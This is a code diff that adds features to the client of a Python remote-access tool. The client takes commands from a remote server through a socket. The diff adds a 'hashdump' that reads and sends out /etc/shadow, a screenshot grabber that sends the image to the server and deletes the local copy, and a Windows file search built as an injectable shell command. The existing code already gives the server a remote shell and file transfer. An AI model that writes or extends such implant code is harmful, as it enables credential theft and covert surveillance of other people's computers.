@@ -4,6 +4,7 @@ from platform import system as find_system
 import os
 from subprocess import check_output, DEVNULL, PIPE, run, Popen
 from secure_socket import Client, HOSTNAME
+import pyscreenshot
 
 class Computer:
   def shell(self, socket):
@@ -28,10 +29,23 @@ class Computer:
       cmd=socket.receive()
     os.chdir(origin)
 
+  def screenshot(self,filename):
+    screenshot = pyscreenshot.grab()
+    file_path = f'{os.getcwd()}/{filename}'
+    screenshot.save(file_path)
+    return file_path
+
 class Linux(Computer):
   def ipconfig(self):
     return check_output(["ip", "a"]).decode('utf-8')
+
+  def hashdump(self):
+    if os.access('/etc/shadow', os.R_OK):
+      return check_output(["cat", "/etc/shadow"]).decode('utf-8')
+    else:
+      socket.send("You don't have permission for it.")
   
+
   def get_env(self):
     user=os.getlogin()
     path=os.getcwd()
@@ -55,8 +69,8 @@ class Linux(Computer):
     
 class Windows(Computer):
   def ipconfig(self):
-    return check_output(["ipconfig"]).decode('utf-8')
-
+    return check_output(["ipconfig"]).decode('latin-1')
+  
   def get_env(self):
     user=os.getlogin()
     path=os.getcwd()
@@ -67,6 +81,17 @@ class Windows(Computer):
   def get_prompt(self):
     user, home, path, end = self.get_env()
     return f"{path}{end} "
+  
+  def hashdump(self):
+    return socket.send("Send hashdump .... please wait")
+  
+
+  def search(self,filename, path):
+    command = 'dir /s /b ' + path + filename
+    result =  run(command, stdout=PIPE, stderr=DEVNULL, shell=True)
+    if result.returncode == 0:
+        output = result.stdout.decode('latin-1')
+        return output
 
 def download(socket):
   filename_src, filename_dst=socket.receive().split('*')
@@ -109,9 +134,16 @@ if __name__ == "__main__":
         socket.receive_file()
       case "download":
         download(socket)
+      case "hashdump":
+        socket.send(system.hashdump())
       case "search":
         filename, path = socket.get_params()
         socket.send(system.search(filename,path))
+      case "screenshot":
+        filename = socket.get_params()
+        cleaned_filename = f'{filename[0]}.png'
+        socket.send_file(system.screenshot(cleaned_filename),cleaned_filename)
+        os.remove(cleaned_filename)
       case "delete":
         using=False
       case _:
